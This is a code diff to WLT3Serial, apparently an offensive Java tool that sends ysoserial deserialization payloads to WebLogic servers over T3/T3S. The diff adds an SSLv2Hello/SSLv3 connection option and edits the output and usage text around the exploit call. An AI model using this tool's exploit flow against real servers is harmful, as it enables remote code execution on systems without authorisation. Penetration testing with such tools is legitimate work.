@@ -136,6 +136,17 @@ public class WLT3Serial {
 								return;
 							}
 							break;
+						case "--t3s=SSLv2": //use T3S to connect with SSLv2Hello, falling back to SSLv3 after handshake
+							if(!tlsSet) {
+								t3s = true;
+								System.setProperty("jdk.tls.client.protocols","SSLv2Hello,SSLv3");
+								tlsSet = true;
+							} else {
+								System.err.println("Error: Multiple SSL/TLS version options set, please choose only one version\n");
+								usage();
+								return;
+							}
+							break;
 					}
 				} else {
 					System.err.println("Error: Invalid option \""+opt+"\"\n");
@@ -153,9 +164,22 @@ public class WLT3Serial {
 			}
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
+
+			//display connection information			
+			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port));
+			if(t3s) {
+				String encProt = System.getProperty("jdk.tls.client.protocols");
+				System.out.print(" (with ");
+				if(encProt.contains("SSLv2Hello")) {
+					System.out.print("SSLv2Hello handshake and SSLv3)");
+				} else {
+					System.out.print(encProt);
+				}
+				System.out.print(")");
+			}
+			System.out.print(": ... ");
 			
-			//run exploit
-			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+(t3s ? " (with "+System.getProperty("jdk.tls.client.protocols")+")" : "")+": ... ");
+			//run exploit			
 			switch(method) {
 				case "Property":
 					ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
@@ -183,7 +207,7 @@ public class WLT3Serial {
 		}
 	}
 	
-	//check current JVM security policy, and enable SSL (v3) communication if disabled
+	//check current JVM security policy, and enable SSLv3 communication if disabled by default
 	static void enableSSL() {
 		String tlsSecProp = Security.getProperty("jdk.tls.disabledAlgorithms");
 		if(tlsSecProp.contains("SSLv3")) {
@@ -210,7 +234,7 @@ public class WLT3Serial {
 		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
 		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)\n\t\t\tTLSv1.1\n\t\t\tTLSv1\n\t\t\tSSLv3");
-		System.err.println("\t\t\t(Note: SSLv2 is unsupported.)\n\n");
+		System.err.println("\t\t\tSSLv2\n\t\t\t(Note: \"SSLv2\" protocol option only performs initial handshake with SSLv2Hello, then uses SSLv3 for communication: this is a Java limitation)\n\n");
 		
 		//list available ysoserial payload types, or print error on failure
 		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
